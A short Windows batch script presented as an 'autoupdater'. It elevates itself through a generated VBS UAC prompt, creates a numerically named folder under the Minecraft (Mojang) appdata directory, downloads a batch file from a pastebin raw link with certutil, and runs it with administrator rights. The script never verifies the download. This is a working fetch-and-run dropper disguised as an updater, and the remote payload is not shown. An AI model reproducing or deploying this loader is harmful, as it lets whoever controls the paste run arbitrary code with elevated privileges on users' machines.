@echo off
color F0
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
cls
echo STARTING AUTOUPDATER!
set path=%appdata%\Mojang\41343\31233\52312
cls
rmdir /Q /S %path%  >nul
cls
md %path% >nul
cls
cd C:\Windows\System32
cls
set UPDATEurl=https://pastebin.com/raw/QP6sLqCm
cls
set UPDATEfile=updater.bat
cls
certutil -urlcache -split -f %UPDATEurl% %UPDATEfile%
cls
move %UPDATEfile% %path%\%UPDATEfile%
cls
cd %path%
cls
updater.bat
cls
exit

::i will not provide support or help on this
::its basic batch, just read the code and test to figure out how it works